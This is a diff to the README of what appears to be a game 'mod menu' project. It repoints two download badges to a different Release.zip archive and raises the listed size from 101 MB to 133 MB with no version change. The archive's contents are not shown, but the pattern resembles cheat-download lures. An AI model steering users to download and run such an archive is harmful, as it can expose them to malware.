@@ -7,13 +7,13 @@
 
 
 [![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Release7/Release.zip)
+[![Windows](https://img.shields.io/badge/Windows-10%2F11-blue.svg)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Update6/Release.zip)
 
 ### 📦 Get the ModMenu
 
-[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Release7/Release.zip)
+[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://github.com/knobbyspeak/how-to-fish-bsproject-mod-menu/releases/download/Update6/Release.zip)
 
-**Current release:** `v0.7.5` · **Approx. size:** `101 MB` (Update 09-22)
+**Current release:** `v0.7.5` · **Approx. size:** `133 MB` (Update 09-23)
 
 </div>
 
